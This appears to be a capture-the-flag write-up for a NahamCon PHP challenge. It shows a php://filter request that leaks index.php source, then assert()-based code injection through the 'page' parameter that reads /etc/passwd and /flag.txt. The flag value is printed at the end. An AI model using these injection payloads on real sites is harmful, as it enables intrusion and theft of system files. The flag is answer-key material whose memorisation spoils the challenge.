# Asserted

## Trying things

After a while a noticed that the url was using an argument to change between pages:

```
http://challenge.nahamcon.com:32302/index.php?page=about
```

If i try something like:

```
http://challenge.nahamcon.com:32302/index.php?page=../
```

The page returns: `HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE`

## Digging

I wanted to check the php code of this `index.php` so i researched a bit and i used this:

```
http://challenge.nahamcon.com:32302/index.php?page=php://filter/convert.base64-encode/resource=index
```

To get a base64 encoded `index.php` file. After decoding we can take a look to this friend:

```
<?php

if (isset($_GET['page'])) {
  $page = $_GET['page'];
  $file = $page . ".php";

  // Saving ourselves from any kind of hackings and all
  assert("strpos('$file', '..') === false") or die("HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE");
  
} else {
  $file = "home.php";
}

include($file);

?>
```

Looks like that `assert` function can be abused. Lets try this simple payload:

```
http://challenge.nahamcon.com:30611/index.php?page='. die("HALLO") .'
```

The page printed `HALLO` to the response body so lets try LFI:

```
http://challenge.nahamcon.com:30611/index.php?page='. die(file_get_contents("/etc/passwd")) .'
```
And the server printed the hole file to us, cool. Lets find and get the flag then:

```
http://challenge.nahamcon.com:30611/index.php?page='. die(file_get_contents("/flag.txt")) .'
```

Flag: `flag{85a25711fa6e111ed54b86468a45b90c}`
